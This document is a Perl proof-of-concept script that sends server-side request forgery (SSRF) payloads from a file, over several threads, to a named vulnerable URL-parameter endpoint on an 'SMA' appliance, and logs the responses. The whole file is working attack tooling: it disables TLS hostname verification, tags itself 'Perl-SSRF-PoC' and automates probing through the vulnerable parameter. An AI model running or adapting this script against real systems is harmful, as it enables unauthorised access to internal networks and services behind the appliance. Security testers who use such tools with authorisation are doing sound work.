#!/usr/bin/env perl
use strict;
use warnings;
use feature 'say';
use threads;
use Thread::Queue;
use Getopt::Long;
use LWP::UserAgent;
use URI::Escape;

# ─── Command-line options ─────────────────────────────────────────────────────
my ($target, $endpoint, $payloads_file, $threads, $timeout, $verbose, $help);
GetOptions(
    'target=s'    => \$target,
    'endpoint=s'  => \$endpoint,
    'payloads=s'  => \$payloads_file,
    'threads=i'   => \$threads,
    'timeout=i'   => \$timeout,
    'verbose!'    => \$verbose,
    'help!'       => \$help,
) or &usage;

&usage if $help;
for my $opt ($target, $endpoint, $payloads_file) {
    die "Missing required options\n", &usage if !defined $opt;
}
$threads ||= 5;
$timeout ||= 5;

# ─── Read payloads ──────────────────────────────────────────────────────────────
open my $fh, '<', $payloads_file
  or die "Cannot open payloads file '$payloads_file': $!\n";
chomp( my @payloads = <$fh> );
close $fh;
die "No payloads found in $payloads_file\n" unless @payloads;

# ─── Thread queue ──────────────────────────────────────────────────────────────
my $q = Thread::Queue->new(@payloads);

# ─── Worker subroutine ─────────────────────────────────────────────────────────
sub worker {
    my $ua = LWP::UserAgent->new(
        timeout => $timeout,
        ssl_opts => { verify_hostname => 0 },
        default_headers => HTTP::Headers->new(
            'User-Agent' => 'Perl-SSRF-PoC'
        ),
    );
    while ( defined( my $payload = $q->dequeue_nb ) ) {
        my $enc = uri_escape($payload, q{^A-Za-z0-9\-\._~});  # strict encoding
        my $url = "$target$endpoint$enc";
        say "[+] Testing payload: $payload" if $verbose;
        my $res = $ua->get($url);
        my $code = $res->code // 'ERR';
        printf "[%3s] %s → %s\n", $code, $url, substr($res->decoded_content || '', 0, 80)
          if $verbose or $code ne '200';
        # Log any non-200 or interesting responses:
        if ($code != 200) {
            open my $log, '>>', 'ssrf_errors.log';
            print $log scalar(localtime), " | $code | $url\n";
            close $log;
        }
    }
}

# ─── Spawn threads ──────────────────────────────────────────────────────────────
my @thr;
for (1..$threads) {
    push @thr, threads->create(\&worker);
}

# ─── Wait for completion ───────────────────────────────────────────────────────
$_->join for @thr;
say "Done testing ", scalar(@payloads), " payload(s).";

# ─── Usage message ─────────────────────────────────────────────────────────────
sub usage {
    die <<"EOF";

Usage: $0 --target URL --endpoint PATH?url= --payloads file.txt [options]

  --target     Base URL of the SMA (e.g. https://10.0.0.5)
  --endpoint   Vulnerable endpoint path including trailing param (e.g. /cgi/url?url=)
  --payloads   File with newline-separated payload URLs to test
  --threads    Number of concurrent workers (default: $threads)
  --timeout    HTTP timeout in seconds (default: $timeout)
  --[no]verbose  Show full responses/status (default: off)
  --help       Show this message

EOF
}
